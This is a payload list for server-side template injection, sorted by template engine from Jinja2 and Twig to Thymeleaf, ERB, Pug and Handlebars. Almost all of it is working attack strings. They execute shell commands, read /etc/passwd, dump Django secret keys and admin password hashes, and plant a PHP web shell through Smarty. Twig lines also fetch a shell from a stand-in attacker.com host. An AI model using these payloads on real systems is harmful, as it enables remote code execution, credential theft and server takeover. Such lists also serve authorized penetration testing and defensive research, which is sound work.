# Comprehensive SSTI Payloads
# Server-Side Template Injection
# For authorized security testing only

# === DETECTION / FINGERPRINTING ===
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
@(7*7)
{7*7}
[[${7*7}]]
${{7*7}}
#{{7*7}}
{{7*'7'}}
{{foobar}}
${foobar}
<%= foobar %>
#{foobar}
*{foobar}
{{config}}
${config}
{{self}}
{{request}}
{{settings}}
${{<%[%'"}}%\
a]{{7*7}}[[b
a]${7*7}[[b

# === JINJA2 (Python/Flask) ===
{{7*7}}
{{config}}
{{config.items()}}
{{self}}
{{self.__class__}}
{{self.__class__.__mro__}}
{{self.__class__.__mro__[2]}}
{{self.__class__.__mro__[2].__subclasses__()}}
{{''.__class__}}
{{''.__class__.__mro__}}
{{''.__class__.__mro__[1]}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[2].__subclasses__()[40]}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{''.__class__.mro()[1].__subclasses__()}}
{{''.__class__.__bases__[0].__subclasses__()}}
{{().__class__.__bases__[0].__subclasses__()}}
{{[].__class__.__bases__[0].__subclasses__()}}
{%for x in ().__class__.__base__.__subclasses__()%}{%if"warning"in x.__name__%}{{x()._module.__builtins__['__import__']('os').popen("id").read()}}{%endif%}{%endfor%}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__.os.popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read()}}
{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{url_for.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
{% debug %}
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("id")|attr("read")()}}

# === DJANGO ===
{{7*7}}
{{request}}
{{request.user}}
{{user}}
{{debug}}
{{messages}}
{{''.__class__}}
{{''.__class__.__mro__}}
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}{{e.user.get_username}}:{{e.user.password}}{% endfor %}
{% debug %}
{{settings}}
{{settings.SECRET_KEY}}
{% include "admin/base.html" %}
{% templatetag openblock %} load module {% templatetag closeblock %}
{{request.environ}}

# === TWIG (PHP) ===
{{7*7}}
{{_self}}
{{_self.env}}
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.setCache("ftp://attacker.com")}}
{{_self.env.loadTemplate("ftp://attacker.com/shell.php")}}
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{app.request.server.all|join(',')}}
{{app.request.server.DOCUMENT_ROOT}}
{{dump(app)}}
{{dump(_context)}}

# === FREEMARKER (Java) ===
${7*7}
${7*'7'}
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /etc/passwd") }
[#assign ex="freemarker.template.utility.Execute"?new()]${ ex("id")}
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder",["id"]).start()}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
<#assign classloader=object.class.protectionDomain.classLoader><#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")><#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)><#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>${dwf.newInstance(ec,null)("id")}

# === VELOCITY (Java) ===
${7*7}
$class
$class.inspect("java.lang.Runtime")
$class.inspect("java.lang.Runtime").type
$class.inspect("java.lang.Runtime").type.getRuntime()
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end

# === SMARTY (PHP) ===
{7*7}
{php}echo `id`;{/php}
{php}system('id');{/php}
{php}exec('id');{/php}
{php}passthru('id');{/php}
{php}shell_exec('id');{/php}
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{$smarty.version}
{$smarty.template}
{fetch file='file:///etc/passwd'}
{include file='file:///etc/passwd'}

# === PEBBLE (Java) ===
{{7*7}}
{{ "".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id") }}
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes) }}

# === THYMELEAF (Java/Spring) ===
${7*7}
${T(java.lang.Runtime).getRuntime().exec('id')}
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec('id')}
[[${7*7}]]
[(${7*7})]
*{T(java.lang.Runtime).getRuntime().exec('id')}
~{T(java.lang.Runtime).getRuntime().exec('id')}
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
__${T(java.lang.Runtime).getRuntime().exec('calc')}__::.x
${#this.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}

# === SPRING EL (Java) ===
${7*7}
#{7*7}
*{7*7}
${T(java.lang.Runtime).getRuntime().exec('id')}
#{T(java.lang.Runtime).getRuntime().exec('id')}
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
#{T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
${T(java.lang.System).getenv()}
${T(java.lang.System).getProperty("user.dir")}

# === MAKO (Python) ===
${7*7}
<%
import os
x=os.popen('id').read()
%>
${x}
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.module.cache.util.os.popen('id').read()}
<%import os%>${os.popen("id").read()}

# === TORNADO (Python) ===
{{7*7}}
{% import os %}{{ os.popen("id").read() }}
{% import subprocess %}{{ subprocess.check_output("id", shell=True) }}

# === ERB (Ruby) ===
<%= 7*7 %>
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= File.read('/etc/passwd') %>
<%= Dir.entries('/') %>
<%= %x(id) %>
<%= exec('id') %>
<%= eval("system('id')") %>

# === SLIM (Ruby) ===
= 7*7
= system('id')
= `id`
= IO.popen('id').read

# === HAML (Ruby) ===
= 7*7
= system('id')
= `id`
= IO.popen('id').read

# === JADE/PUG (Node.js) ===
#{7*7}
#{root.process.mainModule.require('child_process').execSync('id')}
#{root.process.mainModule.require('child_process').spawnSync('id').stdout}
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.execSync('id')

# === EJS (Node.js) ===
<%= 7*7 %>
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
<%- include('../../../etc/passwd') %>
<%= include('/etc/passwd') %>

# === NUNJUCKS (Node.js) ===
{{7*7}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
{{range.constructor("return this.constructor.constructor('return this.process')().mainModule.require('child_process').execSync('id')")()}}

# === HANDLEBARS (Node.js) ===
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

# === MUSTACHE (Various) ===
{{#with "s" as |string|}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{/with}}{{/with}}

# === GOLANG (html/template & text/template) ===
{{.}}
{{printf "%s" "test"}}
{{define "T1"}}ONE{{end}}
{{template "T1"}}
{{- /* comment */ -}}
{{ .Name }}

# === DOT (JavaScript) ===
{{= 7*7 }}
{{= global.process.mainModule.require('child_process').execSync('id') }}

# === MARKO (Node.js) ===
${7*7}
${data.name}
${require('child_process').execSync('id')}
